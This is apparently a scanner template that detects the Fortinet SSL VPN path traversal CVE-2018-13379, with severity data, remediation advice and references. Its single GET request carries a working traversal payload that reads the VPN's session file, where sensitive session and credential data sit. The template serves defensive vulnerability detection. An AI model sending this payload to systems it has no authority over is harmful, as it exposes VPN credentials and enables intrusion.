id: CVE-2018-13379

info:
  name: Fortinet SSL VPN Path Traversal
  author: Nathan Watson
  severity: critical
  description: Detects Fortinet CVE-2018-13379 by checking for the presence of the 'var fgt_lang =' variable in the response body
  remediation: Upgrade to FortiOS 5.4.13, 5.6.8, 6.0.5 or 6.2.0 and above. Workarounds - As a temporary solution, the only workaround is to totally disable the SSL-VPN service (both web-mode and tunnel-mode)
  reference:
    - https://nvd.nist.gov/vuln/detail/cve-2018-13379
    - https://www.fortiguard.com/psirt/FG-IR-18-384
    - https://gist.github.com/code-machina/bae5555a771062f2a8225fd4731ae3f7
    - https://github.com/sullo/nikto/blob/master/program/databases/db_tests
    - https://github.com/MelanyRoob/Goby
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-13379
    cwe-id: CWE-22
    epss-score: 0.97088
    epss-percentile: 0.99825
    cpe: cpe:2.3:a:fortinet:fortiproxy:*:*:*:*:*:*:*:*
  metadata:
    vendor: fortinet
    product: fortiproxy
  tags: fortinet,ssl-vpn,traversal,cve2018,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
      
    matchers:
      - type: regex
        regex:
          - "var\\sfgt_lang\\s="
      - type: status
        status:
          - 200